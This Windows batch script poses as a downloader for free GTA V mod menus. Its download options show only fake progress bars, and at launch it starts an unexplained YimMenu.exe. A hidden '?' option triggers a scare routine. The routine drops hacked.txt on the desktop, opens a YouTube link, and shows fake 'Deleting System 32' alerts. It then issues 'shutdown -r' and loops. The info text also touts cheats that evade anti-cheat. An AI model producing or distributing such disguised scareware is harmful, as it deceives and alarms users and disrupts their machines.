@ECHO OFF
color a
chcp 65001 >nul
setlocal enabledelayedexpansion
start YimMenu.exe
:menu
TITLE MainMenu
echo==========================================
echo		   Free
echo	         ModMenus
echo==========================================
echo.
echo - A : YimMenu
echo - B : Kiddions
echo - C : EXIT
echo - ? : ???
set /p ans="Enter:"

if %ans%==A (
goto a
)

if %ans%==B (
goto kiddions
)

if %ans%==C (
goto b
)

if %ans%==? (
goto menu_1_hacked
)

pause > nul
:b
exit
pause > nul
:a
cls
echo.
echo.
echo========================================
echo	   YimMenu
echo========================================
echo.
echo - 1 : Download
echo - 2 : Infos
echo - 3 : EXIT
set /p ans="Enter:"


if %ans%==1 (
goto download_yim
)

if %ans%==2 (
goto infos
)

if %ans%==3 (
goto b
)

pause > nul
:infos
cls
echo 	( 1 )	YimMenu is an open-source mod menu for Grand Theft Auto V.
echo 	( 2 )	It is based on the BigBaseV2 project and is actively developed by the community.
echo 	( 3 )	The menu provides various features such as ESP, aimbot, and protections.
echo 	( 4 )	YimMenu is frequently updated to bypass Rockstar's anti-cheat measures.
echo 	( 5 )	Users can compile the source code themselves or download pre-built versions.
echo.
echo - 1 : Go back
set /p ans="Enter:"
if %ans%==1 (
goto a
)

pause > nul

:download_yim
color c
cls
echo.
set "bar="
set /a progress=0
set "fill=█"

echo Loading...
<nul set /p "=Progress: ["

for /L %%i in (1,1,20) do (
    set "bar=!bar!!fill!"
    set /a progress+=5
    <nul set /p "=!fill!"
    timeout /nobreak /t 3 >nul
)

echo] 100%%
echo.
echo You can now close the Window!

pause > nul
:kiddions
cls
color c
echo========================================
echo              Kiddions 
echo========================================
echo.
echo - 1 : Download
echo - 2 : Infos
echo - 3 : EXIT
set /p ans="Enter:"


if %ans%==1 (
goto download_kiddions
)

if %ans%==2 (
goto infos_kiddions
)

if %ans%==3 (
goto b
) 

pause > nul
:infos_kiddions 
cls
color c
echo test
echo - 1 : Go back
set /p ans="Enter:"
if %ans%==1 (
goto kiddions


pause > nul
:download_kiddions
cls 
color c 
set "bar="
set /a progress=0
set "fill=█"

echo Loading...
<nul set /p "=Progress: ["

for /L %%i in (1,1,20) do (
    set "bar=!bar!!fill!"
    set /a progress+=5
    <nul set /p "=!fill!"
    timeout /nobreak /t 3 >nul
)

echo] 100%%
echo.
echo You can now close the Window!
pause > nul
:menu_1_hacked
TITLE You got Hacked!
cls
echo HAHAHAHAHAHAHAHA
echo ... 
echo You got Hacked!
goto hacking_screen
pause > nul
:hacking_screen
echo You got hacked :) > "%USERPROFILE%\Desktop\hacked.txt"
start www.youtube.com/watch?v=NZh5YxDpuK4
msg * WAIT: You got Hacked!
msg * Theres no way out!
msg * Deleting System 32 ...
cls
echo Fuck ya!
msg * Deleting you ...
cls
shutdown -r
goto hacking_screen
pause > nul
:youtube
start www.youtube.com/watch?v=NZh5YxDpuK4
goto hacking_screen
pause > nul


